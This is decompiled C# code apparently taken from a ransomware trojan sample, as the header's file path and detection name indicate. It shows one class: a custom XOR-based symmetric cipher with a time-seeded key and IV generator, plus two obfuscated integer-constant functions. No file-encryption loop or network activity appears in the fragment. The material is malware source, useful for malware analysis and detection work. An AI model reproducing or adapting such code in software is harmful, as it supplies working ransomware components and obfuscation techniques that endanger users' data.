// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Payment Notification, Version=98.0.1.8107, Culture=neutral, PublicKeyToken=null
// MVID: FA79794C-3025-C735-E6EB-7AA05AC66D58
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Ransom.MSIL.Blocker.gen-9edc14cb7b9c966a121bf2b954dc49826435e452a4b161242d42fda789ed45da.exe

using System;
using System.Security.Cryptography;

internal sealed class \uE00C : SymmetricAlgorithm, ICryptoTransform, IDisposable
{
  private Random \uE002;

  public \uE00C()
  {
    this.\uE002 = new Random(DateTime.Now.Millisecond);
    this.LegalKeySizesValue = new KeySizes[1]
    {
      new KeySizes(128, 128, 0)
    };
    this.KeySize = 128;
    this.LegalBlockSizesValue = new KeySizes[1]
    {
      new KeySizes(128, 128, 0)
    };
    this.BlockSize = 128;
  }

  public override ICryptoTransform CreateEncryptor(byte[] _param1, byte[] _param2)
  {
    _param1.CopyTo((Array) this.Key, 0);
    _param2.CopyTo((Array) this.IV, 0);
    return (ICryptoTransform) this;
  }

  public override ICryptoTransform CreateDecryptor(byte[] _param1, byte[] _param2)
  {
    _param1.CopyTo((Array) this.Key, 0);
    _param2.CopyTo((Array) this.IV, 0);
    return (ICryptoTransform) this;
  }

  public override void GenerateIV()
  {
    byte[] buffer = new byte[16];
    this.\uE002.NextBytes(buffer);
    this.IV = buffer;
  }

  public override void GenerateKey()
  {
    byte[] buffer = new byte[16];
    this.\uE002.NextBytes(buffer);
    this.Key = buffer;
  }

  public int TransformBlock(
    byte[] _param1,
    int _param2,
    int _param3,
    byte[] _param4,
    int _param5)
  {
    int length1 = this.Key.Length;
    int length2 = this.IV.Length;
    for (int index = 0; index < _param3; ++index)
    {
      int num = (int) this.IV[index % length2];
      _param4[index + _param5] = (byte) ((uint) _param1[index + _param2] ^ (uint) this.Key[num % length1]);
    }
    return _param3;
  }

  public byte[] TransformFinalBlock(byte[] _param1, int _param2, int _param3)
  {
    byte[] numArray = new byte[_param3];
    this.TransformBlock(_param1, _param2, _param3, numArray, 0);
    return numArray;
  }

  public bool CanReuseTransform => true;

  public bool CanTransformMultipleBlocks => true;

  public int InputBlockSize => 16;

  public int OutputBlockSize => 16;

  internal static int \uE004(int _param0)
  {
    int num = _param0;
    switch (num - -(--565359739 ^ -565359735))
    {
      case 0:
        return 1290055 + 132547151 - -167656864 - 301494072;
      case 1:
        return ~204075016 + 329290368 - 125215338 << 1;
      case 2:
        return ~(~-65409 >> 7) >> 5;
      case 3:
      case 4:
      case 5:
label_8:
        return 177674587 - 177674589 >> 1;
      case 6:
        return --10;
      default:
        switch (num - (~-97 >> 2))
        {
          case 0:
            return ((198370933 ^ -274474894) + 36943785 >> 4) - -26587313;
          case 2:
            return ~(210767567 - 210767570);
          default:
            goto label_8;
        }
    }
  }

  internal static int \uE005(int _param0)
  {
    switch (_param0 - ~(~-1283926780 - 660390274 ^ -623536446))
    {
      case 0:
        return ((~-977945584 ^ -551982566) + 79584089 ^ -158001330) - 478450165;
      case 1:
        return -61 << 1;
      case 4:
        return ~-((-1824748976 >> 3) - -228093615);
      case 5:
        return ~-386544274 - 30594342 ^ 355949841;
      case 8:
        return (-(736964384 - 329614168) - -197722081 ^ 60962862) + 266113987;
      default:
        return ~(-468570631 ^ -249134694) - -355773539;
    }
  }
}
